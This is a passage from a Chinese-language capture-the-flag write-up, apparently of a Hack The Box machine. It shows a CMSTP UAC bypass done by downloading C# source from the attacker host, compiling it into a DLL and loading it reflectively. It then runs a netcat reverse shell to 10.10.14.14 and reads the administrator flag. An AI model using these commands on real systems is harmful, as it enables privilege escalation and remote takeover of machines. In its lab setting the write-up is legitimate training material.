target[0].MainWindowHandle;        if(WindowHandle == IntPtr.Zero) return IntPtr.Zero;        SetForegroundWindow(WindowHandle);        ShowWindow(WindowHandle, 5);        return WindowHandle;    \}\}
```

查看交互进程`explore.exe`，并将当前进程迁移到对应的进程号中

```
ps -S explore<br style="box-sizing: border-box;">migrate 4824<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeUMx0k0raWC2s64KccYGtjTzMI9ZbEWickeicKwGAJY8HFVZSpQgDcQpw/640?wx_fmt=png)将上面的 C-Sharp 源码命名为 Source.cs，通过 powershell 编译为 dll 文件

```
load powershellpowershell_shellcd \Users\Batman\appdata\local\temp\iwr -uri 10.10.14.14/Source.cs -outfile Source.csAdd-Type -TypeDefinition ([IO.File]::ReadAllText("$pwd\Source.cs")) -ReferencedAssemblies "System.Windows.Forms" -OutputAssembly "CMSTP-UAC-Bypass.dll"
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aemG64ImKpXHMC2grguCBNqTjM0WLPdueIIX3O9aEUYrA6Ciaee1AX09g/640?wx_fmt=png)将该 dll 加载到内存中

```
[Reflection.Assembly]::Load([IO.File]::ReadAllBytes("$pwd\CMSTP-UAC-Bypass.dll"))
```

在本地开启 nc 监听，可以调用导出的函数执行反弹 shell

```
[CMSTPBypass]::Execute("C:\windows\System32\spool\drivers\color\nc.exe -e cmd 10.10.14.14 7777")
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aePmTqAH8IibXRtrLfXxWqn7ic9H7K7LNlW0icSrubOiaNxV4gUDzxZcoWMA/640?wx_fmt=png)截屏 2021-12-20 上午 5.41.02

在本地获取到反弹 shell![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeZnhvFjkslPVmA38k8JkRdJrtPV5Gkm5LtwRqL6ickPGqstbiaz7DfLVg/640?wx_fmt=png)

查看权限以及对应 flag

```
whoami /priv<br style="box-sizing: border-box;">
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeTmMvC0ksZ49BkATpJtjCwb6lXU7P5l6AqX0WAib3hyPibSJDzqKSFHUA/640?wx_fmt=png)截屏 2021-12-20 上午 5.42.49

```
dir c:\Users\administrator\Desktoptype c:\Users\administrator\Desktop\root.txt
```

![](https://mmbiz.qpic.cn/mmbiz_png/iar31WKQlTTqQolGUk4Aic4MFYGfibH99aeSQ67L4nBgZA9DIB6B97mPvu1FIh85rmFSlIoIV3sS97XYT7gW6GhrQ/640?wx_fmt=png)截屏 2021-12-20 上午 5.43.06